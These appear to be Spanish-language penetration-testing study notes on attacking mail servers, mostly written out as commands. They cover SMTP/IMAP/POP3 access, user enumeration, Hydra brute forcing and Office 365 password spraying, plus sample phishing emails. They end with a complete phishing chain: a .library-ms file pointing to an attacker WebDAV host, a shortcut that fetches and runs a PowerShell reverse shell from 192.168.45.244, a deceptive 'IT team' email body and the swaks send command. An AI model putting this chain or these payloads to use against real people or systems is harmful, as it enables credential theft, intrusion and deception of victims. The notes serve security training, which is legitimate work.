#mail #smtp #pop3 
## Interactuar con el protocolo 
### SMTP
Ejemplo de envío de correo con telnet 
```bash
telnet $target 25
220 smtp.example.com ESMTP Postfix
HELO test.com
250 smtp.example.com Hello test.com [X.X.X.X]
MAIL FROM:<notifications@inlanefreight.com>
250 OK
RCPT TO:<employees@inlanefreight.com>
250 OK
DATA
354 End data with <CR><LF>.<CR><LF>
Subject: Company Notification
Hi All, we want to hear from you! Please complete the following survey: http://mycustomphishinglink.com/

.
250 OK: queued as XXXX
QUIT
221 Bye

```
### IMAP - Con credenciales
#### `openssl`

```bash
# Si es conexión normal -143 
telnet $target 143
# Si es conexión SSL - 993
openssl s_client -connect $target:imaps
# Después de recibir toda la inforamción podemos conectarnos del siguiente modo
a LOGIN your_username your_password
# listar carpetas de correo
a LIST "" "*"
# Para ver los correos de una carpeta específica (sopongamos que en list aparece INBOX)
a SELECT INBOX
# Para leer los correos debemos escribir FETCH seguido del ID del correo
a FETCH 1 BODY[TEXT]
# podríamos haber puesto BODY[HEADER], BODY[1] (texto plano)
```
#### curl 
Utilizaremos la flag `-k`, para realizar conexiones sin verificar el certificado
##### Autenticarse en el servidor y listar carpetas de correo
```bash
curl -k --user <username>:<password> "imaps://$target" 
```
##### Seleccionar una carpeta
El resultado anterior devolverá una lista de carpetas, p. ej: `INBOX`
```bash
curl -k --user <username>:<password> "imaps://$target/INBOX"

```
##### Leer /interactuar con el contenido del correo
```bash
# Mostrar todos los correos disponibles
curl --user marlin@inlanefreight.htb:poohbear "imap://$target/INBOX;UID=1:*"
# Leer contenido de un correo
curl -k --user <username>:<password> "imaps://$target/INBOX;UID=1"
# Si queremos solo encabezado 
curl -k --user <username>:<password> "imaps://$target/INBOX;UID=1/HEADER"
# Si queremos solo cuerpo
curl -k --user <username>:<password> "imaps://$target/INBOX;UID=/TEXT"
# Si queremos marcar un correo como leído
curl -k --user <username>:<password> "imaps://$target/INBOX;UID=1/SEEN"
# Si queremos borrar un correo
curl -k --user <username>:<password> "imaps://$target/INBOX;UID=1" -X "DELETE"
# Si queremos guardar el contenido
curl -k --user <username>:<password> "imaps://$target/INBOX;UID=1/TEXT" --output correo.txt
```

### **POP3 - Con credenciales**

#### `openssl`

```bash
openssl s_client -connect $target:pop3s
# Una vez conectados, podemos autenticarnos del siguiente modo
USER <username>
+OK
PASS <password>
+OK Mailbox locked and ready
# Tras autenticarnos podemos listar correos
LIST
# Con los correos listados podemos leer el contenido con RETR para leer el contenido de manera temporal 
RETR 1
# Podemos también eliminar mensajes
DELE 1
# Terminar sesión
QUIT
```
En un oneliner
```bash
{ echo "USER simon"; echo 'PASS 8Ns8j1b!23hs4921smHzwn'; echo "RETR 1"; echo "QUIT";} | openssl s_client -connect $target:995 -quiet > correo1.txt
```
#### curl
Utilizaremos la flag `-k`, para realizar conexiones sin verificar el certificado
##### Autenticación en el servidor y listar correos
```bash
curl -k --user <username>:<password> "pop3s://$target/"
```
##### Leer/interactuar con correos
Con la información obtenida, podemos leer un correo con un `ID` determinado
```bash
# Obtener el contenido de un correo
curl -k --user <username>:<password> "pop3s://$target/1"
# Descargar el contenido del correo a un archivo
curl -k --user <username>:<password> "pop3s://$target/1" --output correo.txt
# Eliminar un correo
curl -k --user <username>:<password> "pop3s://$target/1" -X "DELE"
```
## Footprinting

### Búsqueda de servidores MX
Los servidores de correo normalmente tendrán un servicio SMTP y algún protocolo para la recepción de correos
#### Con host
```bash
host -t MX hacktebox.eu
```
#### Con dig
```bash
dig mx plaintext.do | grep "MX" | grep -v ";"
```
### Puertos - nmap
Los puertos que nos podemos encontrar típicamente en un servidor de correo son los siguientes

| **Port**  | **Service**                                                                |
| --------- | -------------------------------------------------------------------------- |
| `TCP/25`  | SMTP Unencrypted                                                           |
| `TCP/143` | IMAP4 Unencrypted                                                          |
| `TCP/110` | POP3 Unencrypted                                                           |
| `TCP/465` | SMTP Encrypted                                                             |
| `TCP/587` | SMTP Encrypted/[STARTTLS](https://en.wikipedia.org/wiki/Opportunistic_TLS) |
| `TCP/993` | IMAP4 Encrypted                                                            |
| `TCP/995` | POP3 Encrypted                                                             |
```bash
sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 $target
```
### Información del servidor
#### SMTP - banner grabbing
```bash
telnet $target 25
```
- Verificar si el servidor permite actualizar la conexión a una cifrada mediante STARTTLS
	```bash
	openssl s_client -starttls smtp -connect $target:25
	```
#### IMAPS - banner grabbing
```bash
openssl s_client -connect $target:imaps
```

#### POP3 - Banner grabbing
```bash
openssl s_client -connect $target:pop3s
```

### Validación de configuración de SPF, DKIM y DMARC
#### Registros SPF - Servidores autorizados a envíar correos al dominio
```bash
dig txt $domain | grep "v=spf"
```
#### DKIM - Identificar clave del dominio
```bash
dig txt default._domainkey.$domain
```
### Consultar registros DMARK
```bash
dig txt _dmarc.$domain
```

## Ataques específicos del protocolo
### SMTP 
#### Comandos que soporta el servidor - `nmap`
Muchos servidores de correo pueden tener **`EXPN`** y **`VRFY`** deshabilitados por razones de seguridad. Podemos conocer los comandos que soporta el servidor escribiendo lo siguiente
```bash
sudo nmap -Pn -p25 --script smtp-commands $target
```
#### Enumerar usuarios - Manual

- `VRFY` - Validar nombre de usuario de mail
	```bash
	telnet $target 25
	# Una vez conectados en función de la respuesta el usuario existirá o no
	VRFY www-data
	
	252 2.0.0 www-data
	```
 - `RCPT TO` - Validar usuarios 
	```bash
	telnet $target 25
	# Una vez conectados en función de la respuesta el usuario existirá o no
	RCPT TO john
	
	250 2.1.5 john... Recipient ok
	```
-  `EXPN` - Permite validar listas de usuarios (`all`, `support-team`...)
	```bash
	telnet $target 25
	# Nos puede devolver una lista en vez de una respuesta booleana
	EXPN support-team

	250 2.0.0 carol@inlanefreight.htb
	250 2.1.5 elisa@inlanefreight.htb
	```
#### Enumerar usuarios - `smtp-user-enum`
Con el parámetro `-M` podemos especificar como argumento cómo aplicaremos fuerza bruta (`VRFY`, `EXPN`, `RCPT`)
```bash
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t $target
```
#### Fuerza bruta
```bash
hydra -l 'nombreUsuario' -P /usr/share/wordlists/rockyou.txt smtp://$target
```

### Open relay
#### Identificación con nmap
```bash
sudo nmap $target -p25 -Pn --script smtp-open-relay -v
```
### Envío de email con `swak`
```bash
swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server $target
# Ejemplo de offsec en el que se hardcodean las credenciales. config.Library-ms es un tipo de ataque que se ve en client-side attacks: 
sudo swaks -t dave.wizard@supermagicorg.com --from test@supermagicorg.com --attach @config.Library-ms --server $target --body @body.txt --header "Subject: Staging Script" --suppress-data --auth-user test@supermagicorg.com --auth-password 'test'
```
### POP3
#### Enumeración de usuarios - `USER`
```bash
telnet $target 110	
# Una vez conectados podemos probar a envíar el comando USER. 
USER john

+OK
```
#### Fuerza bruta - hydra
```bash
hydra -L users.txt -p 'Company01!' -f $target pop3
```
En usuarios debe ser un correo completo (ej: `marlin@inlanefreight.htb`)
#### IMAP
##### Fuerza bruta -hydra
Algunos servidores IMAP permiten enumerar usuarios mediante combinaciones `LOGIN` y errores de autenticación
```bash
hydra -L users.txt -P passwords.txt imap://$target
```
### Enumeración en la nube
#### O365 Spray - Microsoft Office 365
- Validación de si nuestro objetivo utiliza Office 365
	```bash
	python3 o365spray.py --validate --domain msplaintext.xyz
	```
- Identificación de usuarios
	```bash
	python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
	```
- Password spraying
	```bash
	python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
	```
## Ejemplo completo de phishing (offsec) vía Windows Library Files
- Para que este tipo de ataque sea efectivo necesitamos 
	- Un usuario válido SMTP (si tenemos las credenciales de un usuario en el AD, esa deberían servir)
	- Correos electrónicos válidos de cuentas de usuario (supongamos que hemos recopilado `john` en `corp.com`-> Probaremos con `john@corp.com`)
	- Servidor SMTP (puerto 25, 465 ó 587 abierto)
- Montamos un servidor WebDAV en nuestra máquina pwnbox
	```bash
	wsgidav --host=0.0.0.0 --port=80 --root=$(pwd) --auth=anonymous
	```
- Creamos una biblioteca en la máquina Windows tipo `.library-ms`: son archivos en formato XML, y proporcionan accesos virtuales que organizan archivos desde múltiples ubicaciones en una sola vista. Creamos un archivo llamado `config.library-ms`:
	```xml
	<?xml version="1.0" encoding="UTF-8"?>
	<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
	<name>@windows.storage.dll,-34582</name>
	<version>6</version>
	<isLibraryPinned>true</isLibraryPinned>
	<iconReference>imageres.dll,-1003</iconReference>
	<templateInfo>
	<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
	</templateInfo>
	<searchConnectorDescriptionList>
	<searchConnectorDescription>
	<isDefaultSaveLocation>true</isDefaultSaveLocation>
	<isSupported>false</isSupported>
	<simpleLocation>
	<url>http://192.168.45.244</url>
	</simpleLocation>
	</searchConnectorDescription>
	</searchConnectorDescriptionList>
	</libraryDescription>
	```
	Una vez creado clicamos en él para que se serialice información del archivo  
  
- Creamos ahora un `Shortcut` (`Botón derecho > new > shotcut`) con el nombre `automatic_configuration.lnk` y el siguiente contenido:
	```powershell
	powershell.exe -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.244:8000/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell 192.168.45.244 4444"
	```
- Nos aseguramos que en nuestro servidor WebDAV esté la siguiente información: 
	- `Body`: Cuerpo del mensaje (ej):
		```textplain
		Hello! My name is Dwight, and I'm a new member of the IT Team.
		
		This week I am completing some configurations we rolled out last week.
		To make this easier, I've attached a file that will automatically
		perform each step. Could you download the attachment, open the
		directory, and double-click "automatic_configuration"? Once you
		confirm the configuration in the window that appears, you're all done!
		
		If you have any questions, or run into any problems, please let me
		know!%
		``` 
	- `automatic_configuration.lnk`: Lo podemos mover desde la máquina windows al propio servidor WebDAV
	- `config.Library-ms`:  Lo podemos mover desde la máquina windows al propio servidor WebDAV (Puede parecer que metemos un archivo dentro de sí mismo, porque tras clicar en `config.Library-ms` abrimos el WebDAV, y lo que hacemos es copiar este archivo dentro de la carpeta)
	- `Invoke-ConPtyShell.ps1`: Lo copiamos desde nuestra kali para el ataque
- Supongamos que `$target` es el servidor SMTP, que tenemos un correo al que envíar información (`dave.wizard@supermagicorg.com`) y credenciales válidas para el usuario `test`, que tiene correo  `test@supermagicorg.com` y password `test`
	```bash
	 sudo swaks -t dave.wizard@supermagicorg.com --from test@supermagicorg.com,anita@supermagicorg.com --attach @config.Library-ms --server $target --body @body.txt --header "Subject: Staging Script" --suppress-data --auth-user test@supermagicorg.com --auth-password 'test'
	```
- Tras ponernos en escucha en nuestra pwnbox deberíamos recibir una revshell si el usuario pincha en el correo